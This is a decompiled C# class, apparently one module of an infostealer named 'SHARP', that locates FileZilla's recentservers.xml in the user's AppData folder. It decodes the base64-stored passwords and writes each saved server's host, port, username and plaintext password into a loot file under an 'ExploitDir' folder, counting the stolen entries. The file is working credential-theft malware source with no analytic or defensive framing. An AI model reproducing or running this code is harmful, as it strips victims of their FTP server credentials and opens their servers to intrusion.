﻿using System;
using System.IO;
using System.Text;
using System.Xml;

namespace SHARP
{
	// Token: 0x02000044 RID: 68
	internal class FileZilla
	{
		// Token: 0x06000142 RID: 322 RVA: 0x00007010 File Offset: 0x00005210
		public static void GetFileZilla()
		{
			string exploitDir = Help.ExploitDir;
			if (!File.Exists(FileZilla.FzPath))
			{
				return;
			}
			Directory.CreateDirectory(exploitDir + "\\FTP\\FileZilla");
			FileZilla.GetDataFileZilla(FileZilla.FzPath, exploitDir + "\\FTP\\FileZilla\\FTP\\FileZilla.log", "RecentServers", "Server");
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00007060 File Offset: 0x00005260
		public static void GetDataFileZilla(string PathFZ, string SaveFile, string RS = "RecentServers", string Serv = "Server")
		{
			try
			{
				if (File.Exists(PathFZ))
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(PathFZ);
					foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName(RS)[0]).GetElementsByTagName(Serv))
					{
						XmlElement xmlElement = (XmlElement)obj;
						string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
						string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
						string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
						if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3) || string.IsNullOrEmpty(@string))
						{
							break;
						}
						FileZilla.SB.AppendLine("Host: " + innerText);
						FileZilla.SB.AppendLine("Port: " + innerText2);
						FileZilla.SB.AppendLine("User: " + innerText3);
						FileZilla.SB.AppendLine("Pass: " + @string + "\r\n");
						Counting.FileZilla++;
					}
					if (FileZilla.SB.Length > 0)
					{
						File.AppendAllText(SaveFile, FileZilla.SB.ToString());
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x040000AA RID: 170
		private static StringBuilder SB = new StringBuilder();

		// Token: 0x040000AB RID: 171
		public static readonly string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
	}
}
